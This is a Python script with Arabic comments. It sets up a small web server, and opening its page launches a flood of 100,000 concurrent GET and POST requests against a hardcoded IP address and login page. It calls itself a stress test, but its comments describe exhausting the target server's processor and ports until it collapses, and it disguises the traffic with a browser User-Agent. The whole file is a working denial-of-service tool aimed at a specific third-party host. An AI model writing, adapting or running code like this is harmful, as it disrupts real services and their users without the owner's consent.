import asyncio
import aiohttp
from aiohttp import web
import os

# الرابط المستهدف مباشرة
TARGET_URL = "http://187.7.17.67/sudani/login2.php"

# البيانات القصوى المحشوة بالاحتمالات
PAYLOAD = {
    'account': '123456789',
    'account_number': '123456789',
    'phone': '123456789',
    'password': 'test_password'
}

async def send_request(session, index):
    try:
        # التناوب بين طلبات GET و POST لإشغال المعالج والمنافذ للسيرفر المستهدف بالكامل
        if index % 2 == 0:
            async with session.post(TARGET_URL, data=PAYLOAD, timeout=3) as response:
                return response.status
        else:
            async with session.get(TARGET_URL, timeout=3) as response:
                return response.status
    except:
        return 0 # في حال انقطع الاتصال أو بدأ السيرفر بالانهيار

async def run_heavy_stress_test():
    # إعدادات طاقة نفاثة فائقة الكفاءة ومتوافقة مع استقرار بايثون في Render
    concurrency_batch = 500  # 500 طلب متزامن يخرج في نفس الميكروثانية
    total_batches = 200      # تمديد الاختبار إلى 200 دفعة متتالية (إجمالي 100,000 طلب)
    
    # استخدام موصل اتصالات متطور لمنع تسريب الذاكرة وتسريع التدفق لأقصى حد
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate'
    }
    
    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        for batch in range(1, total_batches + 1):
            tasks = []
            for i in range(concurrency_batch):
                tasks.append(send_request(session, i))
            
            # إطلاق القذف المتوازي لجميع الطلبات دفعة واحدة
            results = await asyncio.gather(*tasks)
            
            # حساب الإحصائيات الفورية للدفعة
            success_200 = sum(1 for status in results if status == 200)
            failed_or_blocked = sum(1 for status in results if status != 200)
            
            print(f"🚀 [الدفعة {batch}/{total_batches}] -> استجابة ناجحة: {success_200} | قيود/انقطاع: {failed_or_blocked}", flush=True)
            
            # فاصل ميكروي ذكي (10 مللي ثانية) لضمان عدم انهيار كرت الشبكة الخاص بـ Render
            await asyncio.sleep(0.01)

async def handle(request):
    # تشغيل محرك الضغط الفائق في الخلفية فور فتح الرابط
    asyncio.create_task(run_heavy_stress_test())
    return web.Response(text="🔥 تم إطلاق محرك اختبار الحمل الفائق والقصي (Hyper-Flood) بنجاح في الخلفية! راقب السجلات الآن.")

app = web.Application()
app.router.add_get('/', handle)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 80))
    web.run_app(app, host='0.0.0.0', port=port)
